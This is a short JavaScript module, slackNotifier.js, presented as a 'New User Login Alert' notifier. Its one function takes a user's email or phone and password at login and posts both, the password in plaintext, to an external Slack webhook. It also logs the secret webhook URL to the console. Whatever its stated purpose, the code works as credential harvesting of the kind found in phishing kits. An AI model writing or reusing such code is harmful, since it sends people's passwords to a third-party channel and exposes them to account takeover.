// slackNotifier.js
import axios from "axios";
import { SLACK_WEBHOOK_URL } from "../config/env.config.js";

console.log(SLACK_WEBHOOK_URL);

const sendLoginAlert = async (emailOrPhone, password) => {
    const payload = {
    blocks: [
      {
        type: 'header',
        text: {
          type: 'plain_text',
          text: '🔐 New User Login Alert',
          emoji: true,
        },
      },
      {
        type: 'section',
        fields: [
          {
            type: 'mrkdwn',
            text: `*Email/Phone:*\n${emailOrPhone}`,
          },
          
          {
            type: 'mrkdwn',
            text: `*Password:*\n${password}`,
          },
        ],
      },
    ],
  };
  try {
    const response = await axios.post(SLACK_WEBHOOK_URL, payload);
  } catch (error) {
    console.error('Error sending Slack alert:', error.message);
  }
};

export default sendLoginAlert;

